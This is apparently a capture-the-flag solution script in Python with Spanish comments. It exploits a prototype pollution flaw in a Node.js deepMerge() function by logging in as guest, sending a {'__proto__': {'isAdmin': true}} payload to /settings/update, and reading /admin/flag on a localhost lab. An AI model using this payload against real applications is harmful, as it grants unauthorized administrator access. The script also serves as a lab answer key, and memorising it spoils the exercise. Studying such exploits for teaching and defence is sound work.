"""
Solución: Prototype Pollution — SettingsCorp
============================================

La función deepMerge() itera sobre las claves del objeto fuente sin
filtrar claves especiales como __proto__. En JavaScript, acceder a
obj["__proto__"] retorna Object.prototype, contaminándolo.

Flujo del exploit:
  1. Login como guest → obtener token
  2. POST /settings/update con {"settings": {"__proto__": {"isAdmin": true}}}
     → deepMerge escribe isAdmin en Object.prototype
     → TODOS los objetos JS del proceso heredan isAdmin=true
  3. GET /admin/flag → user.isAdmin es truthy (heredado) → devuelve flag

Nota: la contaminación persiste mientras el proceso Node.js esté activo.
"""
import requests

BASE = 'http://localhost:8080'

# Paso 1: Login
print("[*] Iniciando sesión como guest...")
r = requests.post(f'{BASE}/login', json={'username': 'guest', 'password': 'guest123'})
data = r.json()
token = data['token']
print(f"[+] Token: {token}")

# Paso 2: Prototype pollution
headers = {'Authorization': f'Bearer {token}'}
pollution_payload = {'settings': {'__proto__': {'isAdmin': True}}}
print("[*] Enviando payload de prototype pollution...")
r = requests.post(f'{BASE}/settings/update', json=pollution_payload, headers=headers)
print(f"[*] Respuesta: {r.json()}")

# Paso 3: Obtener flag
print("[*] Solicitando /admin/flag...")
r = requests.get(f'{BASE}/admin/flag', headers=headers)
resp = r.json()
print(f"[+] Respuesta: {resp}")

if 'flag' in resp:
    print(f"[+] Flag: {resp['flag']}")
